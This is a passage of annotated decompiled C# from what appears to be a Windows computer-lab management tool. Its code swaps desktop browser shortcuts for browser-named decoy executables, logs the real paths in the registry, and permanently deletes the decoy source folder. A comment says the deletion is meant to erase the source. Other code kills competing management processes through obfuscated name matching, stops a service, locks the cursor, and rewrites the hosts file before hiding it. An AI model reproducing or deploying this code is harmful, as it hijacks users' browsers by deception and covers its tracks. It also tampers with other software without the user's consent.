							ObserverAttr.RateInfo(Registry.CurrentUser, "Software", "firefox", 真实路径, RegistryValueKind.String);
							File.SetAttributes(文件, FileAttributes.Normal);
							Microsoft.VisualBasic.FileSystem.Kill(文件);
							File.Copy(Application.StartupPath + "\\zy\\Firefox.exe", 桌面目录 + "\\Firefox.exe", true);
							命中数++;
						}
						else if (Strings.InStr(文件, "360极速浏览器", CompareMethod.Binary) > 0)
						{
							string 真实路径 = this.ReadShortCut(文件);
							ObserverAttr.RateInfo(Registry.CurrentUser, "Software", "360js", 真实路径, RegistryValueKind.String);
							File.SetAttributes(文件, FileAttributes.Normal);
							Microsoft.VisualBasic.FileSystem.Kill(文件);
							File.Copy(Application.StartupPath + "\\zy\\360极速浏览器.exe", 桌面目录 + "\\360极速浏览器.exe", true);
							命中数++;
						}
						else if (Strings.InStr(文件, "360 极速浏览器X", CompareMethod.Binary) > 0)
						{
							string 真实路径 = this.ReadShortCut(文件);
							ObserverAttr.RateInfo(Registry.CurrentUser, "Software", "360jsx", 真实路径, RegistryValueKind.String);
							File.SetAttributes(文件, FileAttributes.Normal);
							Microsoft.VisualBasic.FileSystem.Kill(文件);
							File.Copy(Application.StartupPath + "\\zy\\360 极速浏览器X.exe", 桌面目录 + "\\360 极速浏览器X.exe", true);
							命中数++;
						}
						else if (Strings.InStr(文件, "QQ浏览器", CompareMethod.Binary) > 0)
						{
							string 真实路径 = this.ReadShortCut(文件);
							ObserverAttr.RateInfo(Registry.CurrentUser, "Software", "qq", 真实路径, RegistryValueKind.String);
							File.SetAttributes(文件, FileAttributes.Normal);
							Microsoft.VisualBasic.FileSystem.Kill(文件);
							File.Copy(Application.StartupPath + "\\zy\\QQ浏览器.exe", 桌面目录 + "\\QQ浏览器.exe", true);
							命中数++;
						}
						else if (Strings.InStr(文件, "极速浏览器", CompareMethod.Binary) > 0)
						{
							string 真实路径 = this.ReadShortCut(文件);
							ObserverAttr.RateInfo(Registry.CurrentUser, "Software", "jisu", 真实路径, RegistryValueKind.String);
							File.SetAttributes(文件, FileAttributes.Normal);
							Microsoft.VisualBasic.FileSystem.Kill(文件);
							File.Copy(Application.StartupPath + "\\zy\\极速浏览器.exe", 桌面目录 + "\\极速浏览器.exe", true);
							命中数++;
						}
						else if (Strings.InStr(文件, "双核浏览器", CompareMethod.Binary) > 0)
						{
							string 真实路径 = this.ReadShortCut(文件);
							ObserverAttr.RateInfo(Registry.CurrentUser, "Software", "shuanghe", 真实路径, RegistryValueKind.String);
							File.SetAttributes(文件, FileAttributes.Normal);
							Microsoft.VisualBasic.FileSystem.Kill(文件);
							File.Copy(Application.StartupPath + "\\zy\\双核浏览器.exe", 桌面目录 + "\\双核浏览器.exe", true);
							命中数++;
						}
						else if (Strings.InStr(文件, "谷歌浏览器", CompareMethod.Binary) > 0)
						{
							Interaction.MsgBox("删除桌面上假google chrome的快捷方式，win7先下载安装正版google chrome再重新设置。", MsgBoxStyle.OkOnly, null);
							Microsoft.VisualBasic.FileSystem.Kill(文件);
						}
						else if (Strings.InStr(文件, "Microsoft Edge", CompareMethod.Binary) > 0)
						{
							string 真实路径 = this.ReadShortCut(文件);
							File.SetAttributes(文件, FileAttributes.Normal);
							Microsoft.VisualBasic.FileSystem.Kill(文件);
							// Edge 的快捷方式常常只是个跳转（目标里没有 .exe），那种不记路径也不替换
							if (Strings.InStr(真实路径, ".exe", CompareMethod.Binary) > 0)
							{
								ObserverAttr.RateInfo(Registry.CurrentUser, "Software", "edge", 真实路径, RegistryValueKind.String);
								File.Copy(Application.StartupPath + "\\zy\\Microsoft Edge.exe", 桌面目录 + "\\Microsoft Edge.exe", true);
								命中数++;
							}
						}
					}
					if (桌面快捷方式 != null)
					{
						桌面快捷方式.Dispose();
					}
				}
				catch
				{
				}
				// 第四轮：公共桌面上的 .lnk（注意「谷歌浏览器」的判断在「极速浏览器」之前，与原版一致）
				try
				{
					IEnumerator<string> 公共桌面快捷方式 = CandidateAttr.SetInfo.FileSystem.GetFiles(公共桌面目录, Microsoft.VisualBasic.FileIO.SearchOption.SearchTopLevelOnly, new string[] { "*.lnk" }).GetEnumerator();
					while (公共桌面快捷方式.MoveNext())
					{
						string 文件 = 公共桌面快捷方式.Current;
						if (Strings.InStr(文件, "360安全浏览器", CompareMethod.Binary) > 0)
						{
							string 真实路径 = this.ReadShortCut(文件);
							ObserverAttr.RateInfo(Registry.CurrentUser, "Software", "360", 真实路径, RegistryValueKind.String);
							File.SetAttributes(文件, FileAttributes.Normal);
							Microsoft.VisualBasic.FileSystem.Kill(文件);
							File.Copy(Application.StartupPath + "\\zy\\360安全浏览器.exe", 公共桌面目录 + "\\360安全浏览器.exe", true);
							命中数++;
						}
						else if (Strings.InStr(文件, "Google Chrome", CompareMethod.Binary) > 0)
						{
							string 真实路径 = this.ReadShortCut(文件);
							ObserverAttr.RateInfo(Registry.CurrentUser, "Software", "chrome", 真实路径, RegistryValueKind.String);
							File.SetAttributes(文件, FileAttributes.Normal);
							Microsoft.VisualBasic.FileSystem.Kill(文件);
							File.Copy(Application.StartupPath + "\\zy\\Google Chrome.exe", 公共桌面目录 + "\\Google Chrome.exe", true);
							命中数++;
						}
						else if (Strings.InStr(文件, "2345加速浏览器", CompareMethod.Binary) > 0)
						{
							string 真实路径 = this.ReadShortCut(文件);
							ObserverAttr.RateInfo(Registry.CurrentUser, "Software", "2345", 真实路径, RegistryValueKind.String);
							File.SetAttributes(文件, FileAttributes.Normal);
							Microsoft.VisualBasic.FileSystem.Kill(文件);
							File.Copy(Application.StartupPath + "\\zy\\2345加速浏览器.exe", 公共桌面目录 + "\\2345加速浏览器.exe", true);
							命中数++;
						}
						else if ((Strings.InStr(文件, "Firefox", CompareMethod.Binary) > 0) | (Strings.InStr(文件, "firefox", CompareMethod.Binary) > 0))
						{
							string 真实路径 = this.ReadShortCut(文件);
							ObserverAttr.RateInfo(Registry.CurrentUser, "Software", "firefox", 真实路径, RegistryValueKind.String);
							File.SetAttributes(文件, FileAttributes.Normal);
							Microsoft.VisualBasic.FileSystem.Kill(文件);
							File.Copy(Application.StartupPath + "\\zy\\Firefox.exe", 公共桌面目录 + "\\Firefox.exe", true);
							命中数++;
						}
						else if (Strings.InStr(文件, "360极速浏览器", CompareMethod.Binary) > 0)
						{
							string 真实路径 = this.ReadShortCut(文件);
							ObserverAttr.RateInfo(Registry.CurrentUser, "Software", "360js", 真实路径, RegistryValueKind.String);
							File.SetAttributes(文件, FileAttributes.Normal);
							Microsoft.VisualBasic.FileSystem.Kill(文件);
							File.Copy(Application.StartupPath + "\\zy\\360极速浏览器.exe", 公共桌面目录 + "\\360极速浏览器.exe", true);
							命中数++;
						}
						else if (Strings.InStr(文件, "360 极速浏览器X", CompareMethod.Binary) > 0)
						{
							string 真实路径 = this.ReadShortCut(文件);
							ObserverAttr.RateInfo(Registry.CurrentUser, "Software", "360jsx", 真实路径, RegistryValueKind.String);
							File.SetAttributes(文件, FileAttributes.Normal);
							Microsoft.VisualBasic.FileSystem.Kill(文件);
							File.Copy(Application.StartupPath + "\\zy\\360 极速浏览器X.exe", 公共桌面目录 + "\\360 极速浏览器X.exe", true);
							命中数++;
						}
						else if (Strings.InStr(文件, "QQ浏览器", CompareMethod.Binary) > 0)
						{
							string 真实路径 = this.ReadShortCut(文件);
							ObserverAttr.RateInfo(Registry.CurrentUser, "Software", "qq", 真实路径, RegistryValueKind.String);
							File.SetAttributes(文件, FileAttributes.Normal);
							Microsoft.VisualBasic.FileSystem.Kill(文件);
							File.Copy(Application.StartupPath + "\\zy\\QQ浏览器.exe", 公共桌面目录 + "\\QQ浏览器.exe", true);
							命中数++;
						}
						else if (Strings.InStr(文件, "谷歌浏览器", CompareMethod.Binary) > 0)
						{
							Interaction.MsgBox("删除桌面上假google chrome的快捷方式，win7先下载安装正版google chrome再重新设置。", MsgBoxStyle.OkOnly, null);
							Microsoft.VisualBasic.FileSystem.Kill(文件);
						}
						else if (Strings.InStr(文件, "极速浏览器", CompareMethod.Binary) > 0)
						{
							string 真实路径 = this.ReadShortCut(文件);
							ObserverAttr.RateInfo(Registry.CurrentUser, "Software", "jisu", 真实路径, RegistryValueKind.String);
							File.SetAttributes(文件, FileAttributes.Normal);
							Microsoft.VisualBasic.FileSystem.Kill(文件);
							File.Copy(Application.StartupPath + "\\zy\\极速浏览器.exe", 公共桌面目录 + "\\极速浏览器.exe", true);
							命中数++;
						}
						else if (Strings.InStr(文件, "双核浏览器", CompareMethod.Binary) > 0)
						{
							string 真实路径 = this.ReadShortCut(文件);
							ObserverAttr.RateInfo(Registry.CurrentUser, "Software", "shuanghe", 真实路径, RegistryValueKind.String);
							File.SetAttributes(文件, FileAttributes.Normal);
							Microsoft.VisualBasic.FileSystem.Kill(文件);
							File.Copy(Application.StartupPath + "\\zy\\双核浏览器.exe", 公共桌面目录 + "\\双核浏览器.exe", true);
							命中数++;
						}
						else if (Strings.InStr(文件, "Microsoft Edge", CompareMethod.Binary) > 0)
						{
							string 真实路径 = this.ReadShortCut(文件);
							File.SetAttributes(文件, FileAttributes.Normal);
							Microsoft.VisualBasic.FileSystem.Kill(文件);
							if (Strings.InStr(真实路径, ".exe", CompareMethod.Binary) > 0)
							{
								ObserverAttr.RateInfo(Registry.CurrentUser, "Software", "edge", 真实路径, RegistryValueKind.String);
								File.Copy(Application.StartupPath + "\\zy\\Microsoft Edge.exe", 公共桌面目录 + "\\Microsoft Edge.exe", true);
								命中数++;
							}
						}
					}
					if (公共桌面快捷方式 != null)
					{
						公共桌面快捷方式.Dispose();
					}
				}
				catch
				{
				}

				// 一个浏览器都没命中的话，就往桌面塞作者的「百度搜索&网址导航.url」
				if (命中数 == 0)
				{
					try
					{
						File.Copy(Application.StartupPath + "\\zy\\百度搜索&网址导航.url", 桌面目录 + "\\百度搜索&网址导航.url", true);
					}
					catch
					{
					}
				}

				// 再把桌面上「网址导航 / 上网导航 / 百度一下」这类同类快捷方式清掉，避免出现重复入口
				try
				{
					IEnumerator<string> 导航快捷方式 = CandidateAttr.SetInfo.FileSystem.GetFiles(桌面目录, Microsoft.VisualBasic.FileIO.SearchOption.SearchTopLevelOnly, new string[] { "*.lnk" }).GetEnumerator();
					while (导航快捷方式.MoveNext())
					{
						string 文件 = 导航快捷方式.Current;
						if ((Strings.InStr(文件, "网址导航", CompareMethod.Binary) > 0) | (Strings.InStr(文件, "上网导航", CompareMethod.Binary) > 0) | (Strings.InStr(文件, "百度一下", CompareMethod.Binary) > 0))
						{
							Microsoft.VisualBasic.FileSystem.Kill(文件);
						}
					}
					if (导航快捷方式 != null)
					{
						导航快捷方式.Dispose();
					}
				}
				catch
				{
				}

				// 最后把 zy\ 目录（含子目录）下的马甲文件永久删除（不进回收站），抹掉来源
				try
				{
					IEnumerator<string> 马甲文件 = CandidateAttr.SetInfo.FileSystem.GetFiles(Application.StartupPath + "\\zy\\", Microsoft.VisualBasic.FileIO.SearchOption.SearchAllSubDirectories, new string[] { "*.*" }).GetEnumerator();
					while (马甲文件.MoveNext())
					{
						string 文件 = 马甲文件.Current;
						CandidateAttr.SetInfo.FileSystem.DeleteFile(文件, UIOption.OnlyErrorDialogs, RecycleOption.DeletePermanently, UICancelOption.DoNothing);
					}
					if (马甲文件 != null)
					{
						马甲文件.Dispose();
					}
				}
				catch
				{
				}
			}
		}

		// Token: 0x0600003E RID: 62 RVA: 0x00006FFC File Offset: 0x000051FC
		/// <summary>
		/// 用 WScript.Shell 读 .lnk 的目标路径（TargetPath），读完释放两个 COM 对象。
		/// 这里走的是 VB 的晚期绑定（NewLateBinding），原样保留。
		/// </summary>
		/// <param name="strFile">快捷方式路径</param>
		/// <returns>快捷方式指向的真实目标路径</returns>
		public string ReadShortCut(string strFile)
		{
			object WScript对象 = RuntimeHelpers.GetObjectValue(Activator.CreateInstance(Type.GetTypeFromProgID("WScript.Shell")));
			object[] 参数;
			bool[] 参数已复制;
			object 快捷方式 = NewLateBinding.LateGet(WScript对象, null, "CreateShortcut", 参数 = new object[] { strFile }, null, null, 参数已复制 = new bool[] { true });
			if (参数已复制[0])
			{
				strFile = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(参数[0]), typeof(string));
			}
			object 快捷方式对象 = RuntimeHelpers.GetObjectValue(快捷方式);
			string 目标路径 = Conversions.ToString(NewLateBinding.LateGet(快捷方式对象, null, "TargetPath", new object[0], null, null, null));
			Marshal.ReleaseComObject(RuntimeHelpers.GetObjectValue(快捷方式对象));
			Marshal.ReleaseComObject(RuntimeHelpers.GetObjectValue(WScript对象));
			return 目标路径;
		}

		// Token: 0x0600003F RID: 63 RVA: 0x0000237F File Offset: 0x0000057F
		/// <summary>
		/// 「帮助」按钮（Button3）：用默认浏览器打开作者站点上的说明页。
		/// </summary>
		/// <param name="sender">事件源</param>
		/// <param name="e">事件参数</param>
		private void SelectInfo(object sender, EventArgs e)
		{
			Process.Start("http://www.jfglzs.com/software/bangzhu.htm");
		}

		// Token: 0x06000040 RID: 64 RVA: 0x000070A0 File Offset: 0x000052A0
		/// <summary>
		/// 清场 + 锁鼠标。四步：
		/// 1. 反复杀 <c>ObserverAttr.m_AccountAttr</c>（外部程序集提供的账号进程名）和 jfglzsn，
		///    直到两个进程都查不到为止；数组取 [0] 时没有进程会越界，原版靠 On Error Resume Next 吞掉；
		/// 2. 遍历所有进程，杀掉「名字长度 ≥ 4 且每个字符的 ASCII 码都落在 102~111（f~o）」的进程；
		/// 3. 放开 DisableCMD、net stop zmserv、停 1 秒、再杀一次 zmserv；
		/// 4. 用 ClipCursor 把鼠标光标限制在主屏矩形内（锁屏效果）。
		/// </summary>
		private void CallInfo()
		{
			checked
			{
				string 服务名 = "zmserv";
				string 账号进程名 = "";
				try
				{
					账号进程名 = Conversions.ToString(ObserverAttr.m_AccountAttr);
				}
				catch
				{
				}
				string 学生端进程名 = "jfglzsn";
				Process[] 账号进程组 = null;
				Process[] 学生端进程组 = null;
				// 一直杀到两个进程都不存在为止：中途没有进程时 [0] 抛越界，被各自的 catch 吞掉
				do
				{
					try
					{
						账号进程组 = Process.GetProcessesByName(账号进程名);
						账号进程组[0].Kill();
					}
					catch
					{
					}
					try
					{
						学生端进程组 = Process.GetProcessesByName(学生端进程名);
						学生端进程组[0].Kill();
					}
					catch
					{
					}
				}
				while (!((账号进程组.Length == 0) & (学生端进程组.Length == 0)));

				// 名字长度 ≥ 4、且每个字符都是 f~o 的进程一律杀掉（作者用来清掉别家管理软件的守护进程）
				int 字符码下限 = 10;
				字符码下限 = 字符码下限 * 10 + 2;
				foreach (Process 进程 in Process.GetProcesses())
				{
					try
					{
						int 名字长度 = Strings.Len(进程.ProcessName);
						if (名字长度 >= 4)
						{
							int j = 1;
							while (j <= 名字长度)
							{
								int 字符码 = Strings.Asc(Strings.Mid(进程.ProcessName, j, 1));
								if (字符码 >= 字符码下限)
								{
									if (字符码 <= 字符码下限 + 9)
									{
										j++;
										continue;
									}
								}
								// 有个字符不在范围内：不再往下比，j 也没走到「长度 + 1」，所以不会杀
								break;
							}
							if (j == 名字长度 + 1)
							{
								进程.Kill();
							}
						}
					}
					catch
					{
					}
				}

				// 放开命令提示符 → 停服务 → 歇 1 秒 → 再确认杀一次
				try
				{
					ObserverAttr.RateInfo(Registry.CurrentUser, "Software\\Policies\\Microsoft\\Windows\\System", "DisableCMD", 0, RegistryValueKind.DWord);
				}
				catch
				{
				}
				try
				{
					Interaction.Shell("net stop zmserv", AppWinStyle.Hide, true, -1);
				}
				catch
				{
				}
				Thread.Sleep(1000);
				try
				{
					Process[] 服务进程组 = Process.GetProcessesByName(服务名);
					服务进程组[0].Kill();
				}
				catch
				{
				}

				// 把鼠标光标锁在主屏范围内
				Form1.RECT 屏幕矩形;
				屏幕矩形.Left = 0;
				屏幕矩形.Top = 0;
				屏幕矩形.Right = Screen.PrimaryScreen.Bounds.Width;
				屏幕矩形.Bottom = Screen.PrimaryScreen.Bounds.Height;
				Form1.ClipCursor(屏幕矩形);
			}
		}

		// Token: 0x06000041 RID: 65 RVA: 0x000073B4 File Offset: 0x000055B4
		/// <summary>
		/// 「选择图片」按钮（Button_selectpic）：从程序目录 wallpaper\ 里挑一张图设成桌面壁纸。
		/// 提示字符串 "设置失败: {ex.Message}" 少了 <c>$</c>，是原版插值写错，原样保留。
		/// </summary>
		/// <param name="sender">事件源</param>
		/// <param name="e">事件参数</param>
		private void VisitInfo(object sender, EventArgs e)
		{
			string 图片路径 = "";
			using (OpenFileDialog openFileDialog = new OpenFileDialog())
			{
				openFileDialog.Filter = "Image Files|*.bmp;*.jpg;*.jpeg;*.png";
				openFileDialog.InitialDirectory = Application.StartupPath + "\\wallpaper";
				if (openFileDialog.ShowDialog() == DialogResult.OK)
				{
					图片路径 = openFileDialog.FileName;
				}
			}
			if (string.IsNullOrEmpty(图片路径))
			{
				MessageBox.Show("请先选择图片文件");
				return;
			}
			try
			{
				this.ResetInfo(图片路径, Form1.WallpaperStyle.Stretched);
			}
			catch (Exception ex)
			{
				MessageBox.Show("设置失败: {ex.Message}");
			}
		}

		// Token: 0x06000042 RID: 66 RVA: 0x00007460 File Offset: 0x00005660
		/// <summary>
		/// 「恢复默认壁纸」按钮（Button_restorepic）：把壁纸换回 Windows 自带的 img0.jpg。
		/// 提示字符串同样少了 <c>$</c>，原版 bug，原样保留。
		/// </summary>
		/// <param name="sender">事件源</param>
		/// <param name="e">事件参数</param>
		private void ForgotInfo(object sender, EventArgs e)
		{
			string 默认壁纸 = "C:\\Windows\\Web\\Wallpaper\\Windows\\img0.jpg";
			try
			{
				this.ResetInfo(默认壁纸, Form1.WallpaperStyle.Stretched);
			}
			catch (Exception ex)
			{
				MessageBox.Show("设置失败: {ex.Message}");
			}
		}

		// Token: 0x06000043 RID: 67 RVA: 0x000074A8 File Offset: 0x000056A8
		/// <summary>
		/// 设置桌面壁纸：校验文件存在 → 写 HKCU\Control Panel\Desktop 的 Wallpaper 与
		/// WallpaperStyle="2"（拉伸）→ 用 SystemParametersInfo(20, 0, 路径, 3) 立即生效。
		/// 注意 <paramref name="wallpaperStyle_0" /> 实际没有参与写入，原版就是这样。
		/// </summary>
		/// <param name="string_0">图片文件路径</param>
		/// <param name="wallpaperStyle_0">壁纸样式（原版未使用）</param>
		private void ResetInfo(string string_0, Form1.WallpaperStyle wallpaperStyle_0)
		{
			if (!File.Exists(string_0))
			{
				throw new ArgumentException("指定的图片文件不存在");
			}
			using (RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("Control Panel\\Desktop", true))
			{
				registryKey.SetValue("Wallpaper", string_0);
				registryKey.SetValue("WallpaperStyle", "2");
			}
			if (!Form1.SystemParametersInfo(20, 0, string_0, 3))
			{
				throw new Win32Exception();
			}
		}

		// Token: 0x06000044 RID: 68 RVA: 0x00007524 File Offset: 0x00005724
		/// <summary>
		/// 往 hosts 里追加一条 <c>127.0.0.1 &lt;域名&gt;</c> 记录：已存在就不重复写，
		/// 否则把整份内容读出来追加一行再写回。原版逐条忽略错误——读失败时后面两句也会失败，
		/// 效果与「整块失败即放弃」一致，所以这里合成一个 try/catch。
		/// </summary>
		/// <param name="string_0">要屏蔽的域名</param>
		private void FlushInfo(string string_0)
		{
			try
			{
				string 本机回环 = "127.0.0.1";
				string 内容 = File.ReadAllText(this.hosts文件路径);
				if (!内容.Contains(本机回环 + " " + string_0))
				{
					内容 = string.Concat(new string[]
					{
						内容,
						Environment.NewLine,
						本机回环,
						" ",
						string_0
					});
					File.WriteAllText(this.hosts文件路径, 内容);
				}
			}
			catch
			{
			}
		}

		// Token: 0x06000045 RID: 69 RVA: 0x00007628 File Offset: 0x00005828
		/// <summary>
		/// 按进程名取 exe 全路径：遍历同名进程，取最后一个进程的 MainModule.FileName。
		/// 没有同名进程时返回空串；取不到（权限不足等）时返回 null —— 原版 catch 之后
		/// 直接返回那个尚未赋值的局部变量，也就是 Nothing。
		/// </summary>
		/// <param name="processName">进程名（不带 .exe）</param>
		/// <returns>exe 全路径，取不到为空串或 null</returns>
		public string GetProcessPathsByName(string processName)
		{
			string 进程路径 = "";
			try
			{
				Process[] 同名进程组 = Process.GetProcessesByName(processName);
				foreach (Process 进程 in 同名进程组)
				{
					进程路径 = 进程.MainModule.FileName;
				}
			}
			catch
			{
				return null;
			}
			return 进程路径;
		}

		// Token: 0x06000046 RID: 70 RVA: 0x0000238C File Offset: 0x0000058C
		/// <summary>
		/// 链接标签（LinkLabel2）：用默认浏览器打开作者站点上的 c16 页面。
		/// </summary>
		/// <param name="sender">事件源</param>
		/// <param name="e">链接点击参数</param>
		private void InsertInfo(object sender, LinkLabelLinkClickedEventArgs e)
		{
			Process.Start("https://www.jfglzs.com/c16.html");
		}

		// Token: 0x06000047 RID: 71 RVA: 0x00007714 File Offset: 0x00005914
		/// <summary>
		/// 下载域名黑名单并合并进 hosts。流程：
		/// 百度 443 探活 → 名单下载到 c:\1.txt → 首行必须含 "www."，否则放弃 →
		/// 跳过名单里「视频网站：」「产品名：」两行之前的表头，按标记切出 主名单 / 视频网站段 →
		/// 读现有 hosts，收集其中已有的 127.0.0.1 域名做去重集合 →
		/// 主名单逐条追成 "127.0.0.1 &lt;域名&gt;"（已存在的跳过）→
		/// 参数为 "off" 时再把视频网站段追加进去 → 写回 hosts 并设成只读+隐藏+系统 →
		/// 放开 DisableCMD → ipconfig /flushdns。
		/// </summary>
		/// <param name="string_0">黑名单地址（http 地址或本地文件路径）</param>
		/// <param name="string_1">"off" 表示连「视频网站」段一起屏蔽</param>
		private void DeleteInfo(string string_0, string string_1)
		{
			checked
			{
				// 主名单止于「视频网站：」的上一条；视频段在「视频网站：」与「产品名：」之间
				int 主名单末行 = 0;
				int 视频段起 = 0;
				int 视频段止 = 0;
				try
				{
					bool 网络可用 = false;
					try
					{
						网络可用 = this.IsPortOpen("www.baidu.com", 443, 2000);
					}
					catch
					{
					}
					if (!网络可用)
					{
						this.hosts已改动 = false;
						return;
					}

					string 名单路径 = "c:\\1.txt";
					using (WebClient webClient = new WebClient())
					{
						webClient.DownloadFile(string_0, 名单路径);
					}
					string[] 名单 = File.ReadAllLines(名单路径);
					// 首行不是域名（多为下载失败时的错误页）就当作没拿到名单
					if (Strings.InStr(名单[0], "www.", CompareMethod.Binary) == 0)
					{
						this.hosts已改动 = false;
						return;
					}

					// 扫一遍名单，记下两个分隔行的位置（行号从 0 开始，所以减 1）
					int 行号 = 0;
					foreach (string 行 in 名单)
					{
						if (Operators.CompareString(行, "视频网站：", false) == 0)
						{
							主名单末行 = 行号 - 1;
							视频段起 = 行号 + 1;
						}
						if (Operators.CompareString(行, "产品名：", false) == 0)
						{
							视频段止 = 行号 - 1;
						}
						行号++;
					}

					// 先把 hosts 的只读/隐藏属性摘掉，否则读得到、写不进去（原版连设两次 Normal）
					File.SetAttributes(this.hosts硬编码路径, FileAttributes.Normal);
					File.SetAttributes(this.hosts硬编码路径, FileAttributes.Normal);
					string 现有hosts = File.ReadAllText(this.hosts硬编码路径);

					// 收集 hosts 里已经屏蔽过的域名，避免重复追加
					HashSet<string> 已屏蔽域名 = new HashSet<string>();
					string[] 现有行 = 现有hosts.Split(new string[] { Environment.NewLine }, StringSplitOptions.None);
					foreach (string 行 in 现有行)
					{
						if (行.Trim().StartsWith("127.0.0.1"))
						{
							string[] 字段 = 行.Trim().Split(new char[] { ' ' }, StringSplitOptions.RemoveEmptyEntries);
							if (字段.Length > 1)
							{
								已屏蔽域名.Add(字段[1].ToLower());
							}
						}
					}

					// 在原 hosts 末尾续写主名单
					StringBuilder 构造 = new StringBuilder(现有hosts);
					构造.AppendLine();
					int 末行 = 主名单末行;
					for (int k = 0; k <= 末行; k++)
					{
						if (!string.IsNullOrEmpty(名单[k].Trim()))
						{
							string 域名 = 名单[k].Trim().Split(new char[] { '/' })[0].Replace("http://", "").Replace("https://", "").ToLower();
							if (!已屏蔽域名.Contains(域名))
							{
								构造.AppendLine("127.0.0.1 " + 域名);
							}
						}
					}
					// "off" 模式再把视频网站段也追加进去
					if (Operators.CompareString(string_1, "off", false) == 0)
					{
						int 段起 = 视频段起;
						int 段止 = 视频段止;
						for (int l = 段起; l <= 段止; l++)
						{
							if (!string.IsNullOrEmpty(名单[l].Trim()))
							{
								string 域名2 = 名单[l].Trim().Split(new char[] { '/' })[0].Replace("http://", "").Replace("https://", "").ToLower();
								if (!已屏蔽域名.Contains(域名2))
								{
									构造.AppendLine("127.0.0.1 " + 域名2);
								}
							}
						}
					}

					File.WriteAllText(this.hosts硬编码路径, 构造.ToString());
					this.hosts已改动 = true;
				}
				catch
				{
				}

				// 改完之后立刻锁死 hosts：只读 + 隐藏 + 系统
				try
				{
					File.SetAttributes(this.hosts硬编码路径, File.GetAttributes(this.hosts硬编码路径) | FileAttributes.ReadOnly | FileAttributes.Hidden | FileAttributes.System);
				}
				catch
				{
				}
				try
				{
					ObserverAttr.RateInfo(Registry.CurrentUser, "Software\\Policies\\Microsoft\\Windows\\System", "DisableCMD", 0, RegistryValueKind.DWord);
				}
				catch
				{
				}
				try
				{
					Interaction.Shell("ipconfig /flushdns", AppWinStyle.Hide, true, -1);
				}
				catch
				{
				}
			}
		}

		// Token: 0x06000048 RID: 72 RVA: 0x00007C2C File Offset: 0x00005E2C
		/// <summary>
		/// Ping 探活：本机没网直接 false，否则 <see cref="M:System.Net.NetworkInformation.Ping.Send(System.String,System.Int32)" />
		/// 返回 IPStatus.Success 才算通，异常一律当不通（原版本文件内无调用者）。
		/// </summary>
		/// <param name="string_0">主机名或 IP</param>
		/// <param name="int_0">超时毫秒数</param>
		/// <returns>通为 true</returns>
		private bool RegisterInfo(string string_0, int int_0)
		{
			bool flag;
			if (!NetworkInterface.GetIsNetworkAvailable())
			{
				flag = false;
			}
			else
			{
				try
				{
					if (new Ping().Send(string_0, int_0).Status == IPStatus.Success)
					{
						flag = true;
					}
					else
					{
						flag = false;
					}
				}
				catch (Exception ex)
				{
					flag = false;
				}
			}
			return flag;
		}

		// Token: 0x06000049 RID: 73 RVA: 0x00007C84 File Offset: 0x00005E84
		/// <summary>
		/// TCP 端口探活：BeginConnect 之后最多等 timeout 毫秒，等到就 EndConnect 并返回
		/// Connected，等不到或抛异常都算不通。用来判断百度 / 作者主页的 443。
		/// </summary>
		/// <param name="hostname">主机名</param>
		/// <param name="port">端口</param>
		/// <param name="timeout">超时毫秒数，默认 2000</param>
		/// <returns>端口可连为 true</returns>
		public bool IsPortOpen(string hostname, int port, int timeout = 2000)
		{
			bool flag;
			try
			{
				using (TcpClient tcpClient = new TcpClient())
				{
					IAsyncResult asyncResult = tcpClient.BeginConnect(hostname, port, null, null);
					if (asyncResult.AsyncWaitHandle.WaitOne(TimeSpan.FromMilliseconds((double)timeout)))
					{
						tcpClient.EndConnect(asyncResult);
						flag = tcpClient.Connected;
					}
					else
					{
						flag = false;
					}
				}
			}
			catch (Exception ex)
			{
				flag = false;
			}
			return flag;
		}

		// Token: 0x0600004A RID: 74 RVA: 0x00007D04 File Offset: 0x00005F04
		/// <summary>
		/// 进程是否在跑：GetProcessesByName 取到任意一个就算在跑。
		/// </summary>
		/// <param name="string_0">进程名（不带 .exe）</param>
		/// <returns>在跑为 true</returns>
		private bool CheckInfo(string string_0)
		{
			return Process.GetProcessesByName(string_0).Length > 0;
		}

		// Token: 0x0600004B RID: 75 RVA: 0x00007D24 File Offset: 0x00005F24
		/// <summary>
		/// 释放设计器容器：先放 components（<c>_StrategyAttr</c> 就是 components），再走基类。
		/// </summary>
		/// <param name="disposing">true 表示由 Dispose() 显式调用</param>
		protected override void Dispose(bool disposing)
		{
			try
			{
				if (disposing && this._StrategyAttr != null)
				{
					this._StrategyAttr.Dispose();
				}
			}
			finally
			{
				base.Dispose(disposing);
			}
		}

		// Token: 0x0600004C RID: 76 RVA: 0x00007D64 File Offset: 0x00005F64
		/// <summary>
		/// 设计器生成的方法：创建全部控件、设置位置/大小/字体/文本并挂好事件（未改动语义）。
		/// </summary>
		private void SearchInfo()
		{
			this.Button1 = new Button();
			this.RadioButton1 = new RadioButton();
			this.RadioButton2 = new RadioButton();
			this.RadioButton4 = new RadioButton();
			this.RadioButton3 = new RadioButton();
			this.RadioButton6 = new RadioButton();
			this.RadioButton5 = new RadioButton();
			this.OpenFileDialog1 = new OpenFileDialog();
			this.Button2 = new Button();
			this.GroupBox4 = new GroupBox();
			this.Label4 = new Label();
			this.Button3 = new Button();
			this.TextBox1 = new TextBox();
			this.Label1 = new Label();
			this.GroupBox5 = new GroupBox();
			this.Label8 = new Label();
			this.pd_new = new TextBox();
			this.Label2 = new Label();
			this.RadioButton10 = new RadioButton();
			this.RadioButton9 = new RadioButton();
			this.Label10 = new Label();
			this.RadioButton12 = new RadioButton();
			this.RadioButton11 = new RadioButton();
			this.GroupBox10 = new GroupBox();
			this.Button_restorepic = new Button();
			this.Button_selectpic = new Button();
			this.GroupBox9 = new GroupBox();
			this.RadioButton13 = new RadioButton();
			this.RadioButton14 = new RadioButton();
			this.Label11 = new Label();
			this.Label12 = new Label();
			this.Label13 = new Label();
			this.Label15 = new Label();
			this.Label16 = new Label();
			this.GroupBox1 = new GroupBox();
			this.GroupBox2 = new GroupBox();
			this.GroupBox3 = new GroupBox();
			this.GroupBox7 = new GroupBox();
			this.GroupBox12 = new GroupBox();
			this.Label7 = new Label();
			this.Label5 = new Label();
			this.Label9 = new Label();
			this.LinkLabel2 = new LinkLabel();
			this.Label14 = new Label();
			this.Label3 = new Label();
			this.Label6 = new Label();
			this.Label17 = new Label();
			this.GroupBox6 = new GroupBox();
			this.RadioButton8 = new RadioButton();
			this.RadioButton7 = new RadioButton();
			this.Label18 = new Label();
			this.GroupBox8 = new GroupBox();
			this.RadioButton16 = new RadioButton();
			this.RadioButton15 = new RadioButton();
